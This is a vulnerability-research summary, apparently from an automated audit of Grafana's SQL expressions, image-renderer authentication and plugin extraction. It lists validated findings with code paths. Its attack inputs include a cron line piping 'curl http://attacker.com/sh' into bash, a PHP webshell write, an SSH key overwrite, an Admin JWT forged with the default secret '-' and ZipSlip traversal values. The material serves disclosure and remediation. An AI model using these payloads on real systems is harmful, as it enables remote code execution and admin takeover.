# Deep Probe Summary: SQL Expressions, Plugin System, Image Renderer

**Status**: complete
**Rounds**: 3
**Total hypotheses generated**: 24
**Validated**: 18
**Stop reason**: comprehensive coverage achieved across all three component areas; diminishing returns expected from further rounds

## Attack Surface Map Reference
`security/probe-workspace/sql-plugin-renderer/attack-surface-map.md`

---

## Validated Hypotheses

### R1-PH-01: SELECT INTO OUTFILE Bypasses the SQL Allowlist
- **Input path**: `pkg/expr/sql/parser_allow.go:113` -- `allowedNode(*sqlparser.Into)`
- **Assumption broken**: The allowlist authors intended `*sqlparser.Into` to allow `SELECT col INTO @var` (variable assignment), but the same AST node type covers `INTO OUTFILE` and `INTO DUMPFILE` variants. No field inspection distinguishes them.
- **Attack input**: `SELECT '* * * * * root curl http://attacker.com/sh | bash' INTO OUTFILE '/etc/cron.d/backdoor'`
- **Code path**: `db.go:47` AllowQuery -> `parser_allow.go:14` sqlparser.Parse -> `parser_allow.go:113` case `*sqlparser.Into: return` (true) -> `db.go:98` engine.Query executes
- **Sanitizers on path**: None -- the allowlist IS the sanitizer, and it allows `*sqlparser.Into` unconditionally
- **Security consequence**: Arbitrary file write to any path writable by the Grafana process
- **Severity estimate**: CRITICAL (when sqlExpressions flag is enabled)
- **Evidence file**: `round-1-evidence.md`

### R1-PH-02: IsReadOnly: true Does Not Block INTO OUTFILE (Delegation Bug)
- **Input path**: `pkg/expr/sql/db.go:82-84` -- `sqle.Config{IsReadOnly: true}`
- **Assumption broken**: Developers assumed `IsReadOnly: true` would block file-write operations. `plan.Into.IsReadOnly()` delegates to its child SELECT node which returns `true`, so the read-only check passes.
- **Attack input**: Any `SELECT ... INTO OUTFILE` query
- **Code path**: `db.go:82` IsReadOnly=true -> `engine.go:787` `readOnlyCheck` -> `Into.IsReadOnly()` -> `Child.IsReadOnly()` -> true -> `true && !true` = false -> no error -> execution continues
- **Sanitizers on path**: `readOnlyCheck` at `engine.go:784-789` -- bypassable because Into.IsReadOnly() delegates to child
- **Security consequence**: Read-only engine config provides no protection against INTO OUTFILE
- **Severity estimate**: CRITICAL (combined with PH-01)
- **Evidence file**: `round-1-evidence.md`

### R1-PH-03: WithDisableFileWrites(true) is the Only Real Guard and It is Not Called
- **Input path**: `pkg/expr/sql/db.go:71` -- `mysql.NewContext()` missing `WithDisableFileWrites`
- **Assumption broken**: The go-mysql-server library provides `WithDisableFileWrites(true)` specifically for this use case (comment says "Intended for embedded or sandboxed use (e.g. SQL expressions)") but Grafana never calls it.
- **Attack input**: Any `SELECT ... INTO OUTFILE` query that passes the allowlist
- **Code path**: `db.go:71` NewContext without WithDisableFileWrites -> `rel.go:600` `ctx.DisableFileWrites()` returns false (zero value) -> guard skipped -> file write proceeds
- **Sanitizers on path**: `DisableFileWrites()` guard at `rel.go:599-601` -- present but never activated
- **Security consequence**: The one mitigation designed for this exact scenario is not wired in
- **Severity estimate**: CRITICAL (combined with PH-01, PH-02)
- **Evidence file**: `round-1-evidence.md`

### R1-PH-04: secure_file_priv Defaults to Empty String -- No Path Restriction
- **Input path**: `go-mysql-server/sql/variables/system_variables.go:2221-2228` -- Default: ""
- **Assumption broken**: With `secure_file_priv = ""`, `isUnderSecureFileDir` returns nil (no restriction). Grafana's commented-out code at `db.go:76-77` would have set it to "" anyway, which also provides no restriction.
- **Attack input**: `SELECT 'ssh-rsa AAAA...' INTO OUTFILE '/root/.ssh/authorized_keys'`
- **Code path**: `rel.go:603-607` GetGlobal("secure_file_priv") -> "" -> `rel.go:547` `secureFileDir == ""` -> return nil -> `rel.go:615` createIfNotExists with attacker path -> `rel.go:578` os.OpenFile creates file
- **Sanitizers on path**: `isUnderSecureFileDir` at `rel.go:546-548` -- present but bypassed when value is ""
- **Security consequence**: No filesystem path restriction on file writes; attacker can target any path writable by Grafana process
- **Severity estimate**: CRITICAL (combined with PH-01 through PH-03)
- **Evidence file**: `round-1-evidence.md`

### R1-PH-05: INTO DUMPFILE Also Covered by Same Allowlisted Node
- **Input path**: `pkg/expr/sql/parser_allow.go:113` -- same `*sqlparser.Into` type
- **Assumption broken**: `INTO DUMPFILE` parses to the same `*sqlparser.Into` AST node. DUMPFILE writes raw binary data without field/line terminators, useful for writing binary payloads.
- **Attack input**: `SELECT UNHEX('7f454c46...') INTO DUMPFILE '/tmp/malicious.so'`
- **Code path**: Same as PH-01 allowlist bypass -> `dml.go:679-681` buildInto with Dumpfile set -> `rel.go:659-673` writes raw content
- **Sanitizers on path**: None
- **Security consequence**: Binary file write capability; single-row restriction limits content size but does not prevent exploitation
- **Severity estimate**: HIGH
- **Evidence file**: `round-1-evidence.md`

### R1-PH-06: Full Content Control via Allowed SQL Functions
- **Input path**: `pkg/expr/sql/parser_allow.go:228,244,248` -- `CONCAT`, `CHAR`, `FROM_BASE64` all allowed
- **Assumption broken**: The allowlist permits string manipulation functions that give the attacker full control over file content
- **Attack input**: `SELECT CONCAT(CHAR(60,63,112,104,112), 'system($_GET[0]); ', CHAR(63,62)) INTO OUTFILE '/var/www/html/x.php'`
- **Code path**: AllowQuery allows CONCAT/CHAR/FROM_BASE64 -> engine executes SELECT -> produces attacker-controlled string -> `rel.go:622-650` writes to file
- **Sanitizers on path**: None -- all string functions are on the allowlist
- **Security consequence**: Attacker can write arbitrary content including PHP webshells, cron jobs, SSH keys, config files
- **Severity estimate**: CRITICAL (combined with PH-01 through PH-04)
- **Evidence file**: `round-1-evidence.md`

### R1-PH-07: Feature Flag sqlExpressions is Global -- Single Admin Enables for All Users
- **Input path**: `pkg/expr/nodes.go:128` -- `toggles.IsEnabledGlobally(FlagSqlExpressions)`
- **Assumption broken**: The flag is a single global boolean, not per-org or per-user. One admin enabling it exposes the attack surface to all authenticated users in all orgs.
- **Attack input**: Admin enables `sqlExpressions = true` in `custom.ini`; Viewer-role user in any org sends OUTFILE payload
- **Code path**: `nodes.go:128` IsEnabledGlobally returns true -> SQL expression processing proceeds without restriction
- **Sanitizers on path**: Feature flag gate -- disabled by default but trivially enabled by any Grafana admin
- **Security consequence**: Attack surface exposure is organization-wide, not user-scoped
- **Severity estimate**: MEDIUM (flag gate exists but scope is too broad)
- **Evidence file**: `round-1-evidence.md`

### R2-PH-01: JWT Forgery with Default Secret "-" Allows Render Auth Bypass
- **Input path**: `pkg/services/rendering/auth.go:58-65` -- `getRenderUserFromJWT`; `pkg/setting/setting.go:2070` -- default `"-"`
- **Assumption broken**: Code assumes operators will change `renderer_token` from default. The single-byte key `"-"` provides no cryptographic protection.
- **Attack input**: Forge HS512 JWT: `{"RenderUser":{"org_id":1,"user_id":1,"org_role":"Admin"},"exp":<future>}` signed with key `"-"`
- **Code path**: `auth.go:41` looksLikeJWT -> true -> `auth.go:58` jwt.ParseWithClaims with key `[]byte("-")` -> validates -> returns RenderUser with Admin role
- **Sanitizers on path**: `jwt.WithValidMethods(["HS512"])` -- checks algorithm but not key strength
- **Security consequence**: Any attacker who can reach Grafana HTTP can forge render JWT and authenticate as Admin via renderKey cookie on any endpoint
- **Severity estimate**: HIGH (requires FlagRenderAuthJWT enabled + default secret)
- **Evidence file**: `round-2-evidence.md`

### R2-PH-02: JWT Replay -- No Revocation, No nbf Enforcement
- **Input path**: `pkg/services/rendering/auth.go:149-164` -- `buildJWTClaims`, `afterRequest` no-op
- **Assumption broken**: JWTs are assumed short-lived enough to prevent replay. No `jti`, `nbf`, or revocation mechanism exists. Default TTL is 5 minutes.
- **Attack input**: Intercepted JWT replayed within 5-minute window
- **Code path**: `jwt.ParseWithClaims` validates only exp -> no replay detection -> original RenderUser returned
- **Sanitizers on path**: `ExpiresAt` claim with 5-minute default TTL -- limits window but does not prevent replay
- **Security consequence**: Intercepted JWTs grant full auth for up to 5 minutes with no cancellation possible
- **Severity estimate**: MEDIUM
- **Evidence file**: `round-2-evidence.md`

### R2-PH-03: OrgRole Escalation via Forged JWT Claim
- **Input path**: `pkg/services/rendering/auth.go:23-27` -- `RenderUser` struct; `pkg/services/authn/clients/render.go:43-57`
- **Assumption broken**: `OrgRole` string from JWT is trusted without server-side validation. No check that the claimed role matches the user's actual role.
- **Attack input**: JWT with `{"org_id":1,"user_id":0,"org_role":"Admin"}` -> TypeRenderService identity with Admin permissions
- **Code path**: `auth.go:67` returns RenderUser -> `render.go:45-47` UserID=0 + OrgRole=Admin -> TypeRenderService identity -> OrgRoles: {1: Admin} -> SyncPermissions: true
- **Sanitizers on path**: None -- OrgRole is a plain string with no validation
- **Security consequence**: Forged JWT can claim any role including Admin
- **Severity estimate**: HIGH (combined with R2-PH-01)
- **Evidence file**: `round-2-evidence.md`

### R2-PH-04: Cache Key Collision -- looksLikeJWT Misroutes Legitimate Keys
- **Input path**: `pkg/services/rendering/auth.go:166-168` -- `looksLikeJWT` prefix check
- **Assumption broken**: `looksLikeJWT` is purely `strings.HasPrefix(key, "eyJ")`. Random 32-char alphanumeric keys have ~1:238k chance of starting with "eyJ". No fallback to cache on JWT parse failure.
- **Attack input**: Legitimate render key that happens to start with "eyJ"
- **Code path**: `auth.go:41` looksLikeJWT returns true -> routed to JWT validation -> parse fails -> returns nil -> render denied
- **Sanitizers on path**: None -- no fallback mechanism
- **Security consequence**: Intermittent render failures (DoS) when FlagRenderAuthJWT is enabled
- **Severity estimate**: LOW
- **Evidence file**: `round-2-evidence.md`

### R2-PH-08: ZipSlip via removeGitBuildFromName + Unsanitized pluginID
- **Input path**: `pkg/plugins/storage/fs.go:88` (ZipSlip check) vs `fs.go:99` (actual destination)
- **Assumption broken**: ZipSlip check validates `filepath.Join(pluginsDir, zf.Name)` but actual extraction uses `removeGitBuildFromName(zf.Name, pluginDirName)` which substitutes `pluginDirName` for the leading path component. If `pluginDirName` contains `..`, the substitution introduces traversal not present in the validated path.
- **Attack input**: `pluginID = "../evil"`, zip entry `"legit-prefix/file.txt"` -> ZipSlip check passes on original name -> `removeGitBuildFromName` produces `"../evil/file.txt"` -> writes outside pluginsDir
- **Code path**: `fs.go:88` ZipSlip check passes -> `fs.go:99` removeGitBuildFromName substitutes traversal -> `fs.go:129` extractFile writes outside pluginsDir
- **Sanitizers on path**: ZipSlip check at `fs.go:91-97` -- present but validates wrong path; `SimpleDirNameGeneratorFunc` at `fs.go:35-37` returns pluginID unchanged
- **Security consequence**: Arbitrary file write outside plugin directory via CLI or config-based plugin install
- **Severity estimate**: MEDIUM (requires CLI access or admin config manipulation)
- **Evidence file**: `round-2-evidence.md`

### R2-PH-09: Symlink Escape via installDir Validation Base
- **Input path**: `pkg/plugins/storage/fs.go:122` -- `extractSymlink(installDir, zf, dstPath)`
- **Assumption broken**: `isSymlinkRelativeTo` validates against `installDir` not `pluginsDir`. If `installDir` escapes via PH-08, symlink confinement is compromised.
- **Attack input**: `pluginDirName = "../etc"` -> `installDir = /etc` -> symlink target "passwd" validates as relative to /etc
- **Code path**: `fs.go:70` installDir = Join(pluginsDir, "../etc") = /etc -> `fs.go:122` extractSymlink("/etc", ...) -> `fs.go:165` isSymlinkRelativeTo("/etc", "passwd", ...) -> allowed
- **Sanitizers on path**: `isSymlinkRelativeTo` at `fs.go:165-181` -- present but validates against wrong base path
- **Security consequence**: Symlink creation in arbitrary directories (dependent on PH-08 and filesystem permissions)
- **Severity estimate**: MEDIUM (requires PH-08 + filesystem write access)
- **Evidence file**: `round-2-evidence.md`

### R3-PH-01: Viewer Role Sufficient for Full SQL INTO OUTFILE Attack
- **Input path**: `pkg/api/api.go:521` -- `authorize(ac.EvalPermission(datasources.ActionQuery))`
- **Assumption broken**: The `/api/ds/query` endpoint requires only `datasources:query` permission, which is granted to Viewer role by default on all datasources.
- **Attack input**: Viewer user sends `POST /api/ds/query` with SQL expression containing INTO OUTFILE
- **Code path**: `api.go:521` authorize(ActionQuery) -> Viewer has datasources:query -> passes -> SQL expression evaluated -> INTO OUTFILE writes file
- **Sanitizers on path**: RBAC check for `datasources:query` -- Viewer passes it
- **Security consequence**: Lowest-privilege authenticated user (Viewer) can trigger the entire file write chain when sqlExpressions is enabled
- **Severity estimate**: CRITICAL (when combined with R1-PH-01 through R1-PH-04)
- **Evidence file**: `round-3-evidence.md`

### R3-PH-02: /render/* Route Has No RBAC -- Viewer Can Invoke Renderer
- **Input path**: `pkg/api/api.go:598-599` -- `r.Get("/render/*", ..., reqSignedIn, hs.RenderHandler)`
- **Assumption broken**: The render endpoint has no RBAC middleware -- only `reqSignedIn` (any authenticated user)
- **Attack input**: Viewer requests `GET /render/<arbitrary-path>`
- **Code path**: `api.go:599` reqSignedIn -> passes for any authed user -> RenderHandler -> raw wildcard path forwarded
- **Sanitizers on path**: `reqSignedIn` -- insufficient; no path validation
- **Security consequence**: Any authenticated user can trigger rendering with arbitrary path parameter
- **Severity estimate**: MEDIUM
- **Evidence file**: `round-3-evidence.md`

### R3-PH-03: renderKey Cookie Authenticates Against ALL Grafana Endpoints
- **Input path**: `pkg/services/authn/clients/render.go:73-78` -- `Test()` checks only cookie presence
- **Assumption broken**: The render authn client fires on ANY HTTP request carrying a `renderKey` cookie, with no endpoint/path/IP scoping. Combined with JWT forgery (R2-PH-01), this allows forging Admin identity for any API endpoint.
- **Attack input**: Set cookie `renderKey=<forged_jwt>` on `POST /api/admin/settings`
- **Code path**: `render.go:73` Test() -> renderKey cookie present -> true -> `render.go:36` Authenticate() -> GetRenderUser -> getRenderUserFromJWT with default secret -> Admin identity -> any endpoint accessible
- **Sanitizers on path**: None -- no endpoint scoping, no IP restriction, no cookie path enforcement
- **Security consequence**: Internet-facing Grafana with FlagRenderAuthJWT enabled and default secret allows unauthenticated attackers to forge Admin access to any API endpoint
- **Severity estimate**: CRITICAL (when FlagRenderAuthJWT enabled + default secret)
- **Evidence file**: `round-3-evidence.md`

### R3-PH-06: renderKey Transmitted in Plaintext HTTP Query Parameter
- **Input path**: `pkg/services/rendering/http_mode.go:72-73` -- `queryParams.Add("renderKey", renderKey)`
- **Assumption broken**: Render keys are sent as URL query parameters in GET requests, making them visible in proxy logs, renderer logs, and network captures.
- **Attack input**: Intercepted render key from logs replayed within 5-minute TTL
- **Code path**: `http_mode.go:72` renderKey in query -> `http_mode.go:143` GET request sent -> key visible in URL -> captured -> replayed via renderKey cookie -> authenticated
- **Sanitizers on path**: 5-minute TTL limits window; TLS between Grafana and renderer mitigates network capture
- **Security consequence**: Render keys in transit are authentication tokens valid for any Grafana endpoint
- **Severity estimate**: MEDIUM
- **Evidence file**: `round-3-evidence.md`

### R3-PH-07: Render JWT Missing aud/iss/jti Claims
- **Input path**: `pkg/services/rendering/auth.go:149-159` -- `buildJWTClaims` sets only `ExpiresAt`
- **Assumption broken**: JWT validation at `auth.go:56-68` checks only algorithm, signature, and exp. No audience, issuer, or token ID validation. Any HS512 JWT signed with the renderer secret passes.
- **Attack input**: HS512 JWT with default secret `"-"`, arbitrary RenderUser claims, future exp
- **Code path**: `auth.go:58` ParseWithClaims -> algorithm HS512 check -> signature check with `"-"` -> exp check -> all pass -> RenderUser returned
- **Sanitizers on path**: `jwt.WithValidMethods(["HS512"])` -- ensures correct algorithm but insufficient without audience/issuer checks
- **Security consequence**: Trivial JWT forgery; no differentiation from legitimate tokens
- **Severity estimate**: HIGH
- **Evidence file**: `round-3-evidence.md`

---

## NEEDS-DEEPER (unresolved, for Phase 8 chambers)

### R3-PH-04B: Internal Path Traversal via ../ in Render Path
- **Why unresolved**: `web.Params(c.Req)["*"]` captures raw wildcard from URL and `getGrafanaCallbackURL` performs pure string concatenation. Whether Go's `net/http` server or Grafana's custom router normalizes `../` before reaching the handler requires runtime testing.
- **Suggested follow-up**: Runtime test with `curl -v 'http://localhost:3000/render/d/../../api/admin/settings'` to confirm whether the router delivers raw `../` to the handler or redirects. If delivered raw, renderer's Chromium resolves `../` and navigates to unintended Grafana pages.

### R3-PH-05: Renderer Default Auth Token "-" Enables Direct Renderer SSRF
- **Why unresolved**: Default `X-Auth-Token: "-"` confirmed in Grafana source. The renderer service is external (grafana-image-renderer); its server-side token validation is not in this repo. Network reachability of the renderer port is deployment-dependent.
- **Suggested follow-up**: (1) Read grafana-image-renderer source to confirm it validates `X-Auth-Token`. (2) Survey common deployments (Docker Compose, Kubernetes Helm charts) for renderer port exposure. (3) Test SSRF by sending direct request to renderer with `X-Auth-Token: -` and arbitrary `url` parameter.

---

## KB Domain Research Used

### go-mysql-server (dolthub) -- Library-as-Consumer Analysis
The KB's identification of `*sqlparser.Into` on the allowlist and the missing `WithDisableFileWrites` call was the primary seed for Round 1. All four conditions identified in the KB domain research were fully validated:
1. Allowlist permits `*sqlparser.Into` (covers both OUTFILE and DUMPFILE)
2. `IsReadOnly` bypass via delegation bug in `plan.Into.IsReadOnly()`
3. `WithDisableFileWrites(true)` not called despite being designed for this use case
4. `secure_file_priv` defaults to "" providing no path restriction

The KB's note about the go-mysql-server session.go comment ("Intended for embedded or sandboxed use (e.g. SQL expressions) where file writes are a security risk") proved critical -- the fix was designed but never wired in.

### golang-jwt/jwt -- JWT Authentication Analysis
The KB's identification of default renderer auth token `"-"` and missing claim enforcement was validated across Rounds 2-3. Key findings:
- Default HS512 signing key is single byte `"-"` -- trivially forgeable
- JWT has only `exp` claim -- no `aud`, `iss`, `nbf`, `jti`
- renderKey cookie authenticates against ALL Grafana endpoints, not scoped to render callbacks
- Combined: unauthenticated internet attacker can forge Admin identity when FlagRenderAuthJWT is enabled

### Plugin Zip Extraction -- TOCTOU Analysis
The KB's identification of the ZipSlip validation vs. extraction path divergence was validated. The `removeGitBuildFromName` regex substitution with unsanitized `pluginDirName` creates a TOCTOU window where validated paths differ from extraction paths.
